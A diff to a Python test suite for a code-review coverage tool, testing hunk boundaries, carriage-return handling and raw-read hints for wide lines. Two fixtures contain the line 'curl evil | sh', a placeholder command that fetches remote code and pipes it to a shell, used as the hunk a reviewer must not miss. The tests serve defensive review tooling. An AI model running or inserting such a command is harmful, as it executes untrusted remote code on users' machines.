@@ -480,14 +480,20 @@ def test_targets_read_the_staged_diff_bytes_without_newline_translation(tmp_path
     assert found["first.sh"].hunks[0].block_end == plain["first.sh"][0].block_end == 26
 
 
-def test_a_hunk_with_carriage_returns_still_requires_its_final_line(tmp_path: Path) -> None:
-    (tmp_path / STAGED_DIFF_NAME).write_bytes(_cr_diff(True).encode("utf-8"))
-    found = coverage.targets({"evidence_files": ["first.sh"]}, tmp_path)
-    (hunk,) = found["first.sh"].hunks
-    short = {STAGED_DIFF_NAME: ((1, hunk.block_end - 1),)}
-    assert not coverage.evaluate(found, ["first.sh"], short, tmp_path).complete
-    whole = {STAGED_DIFF_NAME: ((1, hunk.block_end),)}
-    assert coverage.evaluate(found, ["first.sh"], whole, tmp_path).complete
+def test_a_hunk_after_carriage_returns_still_requires_its_final_line(tmp_path: Path) -> None:
+    diff = (
+        "diff --git a/run.sh b/run.sh\n--- a/run.sh\n+++ b/run.sh\n"
+        "@@ -1 +1 @@\n-a\rb\n+c\n"
+        "@@ -10 +10,2 @@\n ctx\n+curl evil | sh\n"
+    )
+    (tmp_path / STAGED_DIFF_NAME).write_bytes(diff.encode("utf-8"))
+    found = coverage.targets({"evidence_files": ["run.sh"]}, tmp_path)
+    assert [(h.block_start, h.block_end) for h in found["run.sh"].hunks] == [(4, 6), (7, 9)]
+    short = {STAGED_DIFF_NAME: ((1, 8),)}
+    report = coverage.evaluate(found, ["run.sh"], short, tmp_path)
+    assert [(item.start, item.end) for item in report.uncovered] == [(7, 9)]
+    whole = {STAGED_DIFF_NAME: ((1, 9),)}
+    assert coverage.evaluate(found, ["run.sh"], whole, tmp_path).complete
 
 
 def test_hunk_spans_match_the_line_numbers_git_prints(tmp_path: Path) -> None:
@@ -515,3 +521,77 @@ def test_hunk_spans_match_the_line_numbers_git_prints(tmp_path: Path) -> None:
         for hunk in hunks:
             assert lines[hunk.block_start - 1].startswith("@@ ")
             assert lines[hunk.block_end] == "" or lines[hunk.block_end].startswith("diff --git")
+
+
+def _wide_diff(width: int = 900, tail: str = "") -> str:
+    return (
+        "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1 +1 @@\n-a\n+b\n"
+        f"diff --git a/w.py b/w.py\n--- a/w.py\n+++ b/w.py\n@@ -1 +1 @@\n-w\n+{'x' * width}\n"
+        "@@ -9 +9 @@\n-p\n+q\n"
+        "diff --git a/z.py b/z.py\n--- a/z.py\n+++ b/z.py\n@@ -1 +1 @@\n-z\n+y\n" + tail
+    )
+
+
+def test_cut_lines_count_columns_the_way_omp_does() -> None:
+    narrow = "x" * 768
+    text = "\n".join([narrow, narrow + "x", "é" * 768, "é" * 769, "😀" * 384, "😀" * 385, "short"])
+    assert coverage.cut_lines(text) == (2, 4, 6)
+    assert coverage.cut_lines("a\r\nb\n") == ()
+
+
+def test_a_hint_for_a_hunk_with_a_cut_line_names_the_raw_span_to_paste() -> None:
+    text = _wide_diff()
+    hints = coverage.block_hints(["a.py", "w.py", "z.py"], text, "", ["a.py", "w.py", "z.py"])
+    assert hints["a.py"] == f"({STAGED_DIFF_NAME} lines 4-6)"
+    first, after = hunk_index(text)["w.py"]
+    assert hints["w.py"] == (
+        f"({STAGED_DIFF_NAME} lines {after.block_start}-{after.block_end}; "
+        f"read with :raw as {STAGED_DIFF_NAME}:raw:{first.block_start}-{first.block_end})"
+    )
+    assert coverage.cut_lines(text) == (first.block_end,)
+    (zed,) = hunk_index(text)["z.py"]
+    assert hints["z.py"] == f"({STAGED_DIFF_NAME} lines {zed.block_start}-{zed.block_end})"
+
+
+def test_a_hunk_between_two_cut_lines_is_read_raw_too() -> None:
+    wide = "x" * 900
+    text = (
+        "diff --git a/w.py b/w.py\n--- a/w.py\n+++ b/w.py\n"
+        f"@@ -1 +1 @@\n-a\n+{wide}\n@@ -5 +5 @@\n-b\n+c\n@@ -9 +9 @@\n-d\n+{wide}\n@@ -12 +12 @@\n-e\n+f\n"
+    )
+    spans = [(h.block_start, h.block_end) for h in hunk_index(text)["w.py"]]
+    hint = coverage.block_hints(["w.py"], text, "", ["w.py"])["w.py"]
+    raw = ", ".join(f"{STAGED_DIFF_NAME}:raw:{start}-{end}" for start, end in spans[:3])
+    last = f"{STAGED_DIFF_NAME} lines {spans[3][0]}-{spans[3][1]}"
+    assert hint == f"({last}; read with :raw as {raw})"
+
+
+def test_a_hint_keeps_plain_spans_beside_raw_ones() -> None:
+    text = _wide_diff(tail="@@ -20 +20 @@\n-r\n+s\n")
+    modified = "diff --git a/m.py b/m.py\n--- a/m.py\n+++ b/m.py\n@@ -1 +1 @@\n-m\n+n\n"
+    hint = coverage.block_hints(["m.py", "w.py"], modified + text, "", ["m.py", "w.py"])
+    assert hint["m.py"].startswith(f"({STAGED_DIFF_NAME} lines ") and ":raw:" not in hint["m.py"]
+    assert ":raw:" in hint["w.py"]
+
+
+def test_a_promotion_hint_uses_the_upstream_diff_for_its_cut_lines(tmp_path: Path) -> None:
+    path = f"{promotion.STAGED_PROMOTION_DIR}/new/w.py"
+    hint = coverage.block_hints([path], "", _wide_diff(), [path])[path]
+    first = hunk_index(_wide_diff())["w.py"][0]
+    assert f"read with :raw as {UPSTREAM}:raw:{first.block_start}-{first.block_end})" in hint
+
+
+def test_block_hints_read_the_upstream_diff_without_newline_translation(tmp_path: Path) -> None:
+    from theseus_reviewer import cli
+
+    upstream = (
+        "diff --git a/run.sh b/run.sh\n--- a/run.sh\n+++ b/run.sh\n"
+        "@@ -1 +1 @@\n-a\rb\n+c\n"
+        "@@ -10 +10,2 @@\n ctx\n+curl evil | sh\n"
+    )
+    directory = tmp_path / promotion.PROMOTION_PLAN_DIR
+    directory.mkdir()
+    (directory / promotion.UPSTREAM_DIFF_NAME).write_bytes(upstream.encode("utf-8"))
+    path = f"{promotion.STAGED_PROMOTION_DIR}/new/run.sh"
+    hints = cli._block_hints([path], "", tmp_path)
+    assert hints[path] == f"({UPSTREAM} lines 4-6, 7-9)"
